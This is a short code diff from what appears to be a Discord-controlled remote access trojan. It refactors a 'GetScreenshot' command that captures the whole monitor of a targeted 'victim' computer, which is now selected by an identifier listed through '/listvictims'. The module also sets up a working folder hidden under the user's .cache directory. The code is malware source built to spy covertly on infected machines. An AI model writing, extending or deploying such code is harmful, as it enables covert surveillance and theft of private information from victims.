@@ -8,14 +8,16 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 class GetScreenshot(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
-        self.ip_addr = self.bot.ip_addr
         
-    @commands.slash_command(
-        description="Sends screenshot of entire monitor",
-        options=[bot.victim],
-    )
+    @commands.slash_command( )
     async def get_screenshot(self, ctx, victim):
-        if str(victim) == str(self.ip_addr):
+        """Sends screenshot of entire monitor
+
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        """
+        if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
             
             with mss.mss() as sct: 
